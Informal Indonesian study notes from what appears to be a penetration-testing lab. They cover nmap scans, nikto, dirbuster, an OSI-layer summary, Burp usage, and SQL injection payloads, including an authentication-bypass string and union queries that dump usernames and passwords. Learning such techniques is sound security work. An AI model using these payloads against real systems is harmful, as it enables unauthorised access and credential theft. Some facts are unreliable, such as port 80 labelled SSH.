NSLOOKUP - buat tau ip dari URL
![[Pasted image 20230626093929.png]]

Tools-tools yang biasa digunakan itu taunya berdasarkan IP, jadi step 1 kita harus tau ip nya dlu

![[Pasted image 20230626095106.png]]

DNSMapper -> Mencari subdomain dari ip config biar kita bisa dapet ip nya
Ping -> Kirim package
HPing3 -> Ping yang ngirim port bersama package
nmap (Network mapper) -> Mencari map yang di sekitar

`nmap -T4 [HOST]/24`
`nmap -T4 -sV 10.22.121.102`
-sV Version
zenmap -> nmap versi klik klik

21 FTP
80 SSH
443 HTTPS

`nmap -T4 -sV -p- 192.168.153.129`

192.168.153.129

versi apache rendah mungkin vulnerable

`nmap -T4 -sV -O --osscan-guess 192.168.153.129`

nanti di nikto biar ketemu vulnerability and pagenya buka /admin/login

buka dirbuster

ganti linknya, masukkin wordlistnya ganti extensionnya,
wordlist pathnya /usr/share/dirbuster/wordlists/medium

Kenapa pilih 13313 karena itu http kayak web gitu bentuknya analisa

php, xlsx, csv


### OSI LAYER
1. Application Layer
2. Presentation Layer
3. Session Layer
4. Transport Layer
5. Network Layer
6. Data Link Layer
7. Physical Layer

Physical Layer - Pilih courrier
Data Link Layer - Switch - Pilih ukuran package (Perantara / perpanjangan dari router)
Network Layer - IP tujuan 
Transport Layer - Bekerja menghandle port 
TCP / UDP
TCP itu kayak harus tau udah sampe apa belum, di handle with care
UDP itu lempar aja ga harus tau udah sampe, contoh (kayak youtube buffering gitu kan yauda dilempar aja)
Session Layer - Kontrol apakah session/koneksi ini bisa dilanjutin apa engga? (kayak bisa liat si kurir lagi apa)
Presentation Layer - 
Application Layer - Nampilin websitenya


SQLI Bypass
' OR 1 = 1 LIMIT 0,1 #

Union Based SQL
0' UNION SELECT 1, Username, 3, 4, Password FROM SunShineHotel -- -

0' UNION SELECT 1, GROUP_CONCAT(DISTINCT TABLE_NAME SEPARATOR '|'), 3, 4, GROUP_CONCAT(DISTINCT COLUMN_NAME SEPARATOR '|') FROM information_schema.columns WHERE TABLE_SCHEMA=DATABASE()  -- -

cd 

![[Pasted image 20230626150545.png]]


send to intruder brute force
send to repeater kalo mau diulang terus menerus